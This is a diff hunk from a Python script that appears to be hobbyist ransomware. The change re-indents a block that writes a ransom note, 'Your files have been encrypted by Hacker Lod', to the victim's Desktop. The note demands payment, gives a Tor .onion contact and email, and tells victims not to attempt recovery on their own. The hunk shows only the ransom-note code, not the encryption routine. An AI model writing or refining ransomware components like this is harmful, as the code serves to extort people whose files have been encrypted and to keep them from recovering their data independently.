@@ -56,14 +56,14 @@ def main():
         else:
             print
         
-        with open(os.path.join(user_profile, "Desktop", "readme.txt"), "w", encoding="utf-8") as info_file:
-            info_file.write("Your files have been encrypted by Hacker Lod\n")
-            info_file.write("To recover your files, please follow the instructions below:\n")
-            info_file.write("1. Find the encryption key in the file key_abc001.txt very hard.\n")
-            info_file.write("2. Pay the 1$ ransom and contact us with Tor Browser at 2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion and email 3P02made9102@2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion\n")
-            info_file.write("3. After payment, we will send you the decryption program to recover your files.\n")
-            info_file.write("Note: Do not try to recover your files by yourself or use third-party software, as it may lead to permanent data loss.\n")
-            info_file.write("If you have any questions, please contact us immediately.\n")
+    with open(os.path.join(user_profile, "Desktop", "readme.txt"), "w", encoding="utf-8") as info_file:
+        info_file.write("Your files have been encrypted by Hacker Lod\n")
+        info_file.write("To recover your files, please follow the instructions below:\n")
+        info_file.write("1. Find the encryption key in the file key_abc001.txt very hard.\n")
+        info_file.write("2. Pay the 1$ ransom and contact us with Tor Browser at 2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion and email 3P02made9102@2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion\n")
+        info_file.write("3. After payment, we will send you the decryption program to recover your files.\n")
+        info_file.write("Note: Do not try to recover your files by yourself or use third-party software, as it may lead to permanent data loss.\n")
+        info_file.write("If you have any questions, please contact us immediately.\n")
             
 if __name__ == "__main__":
     main()
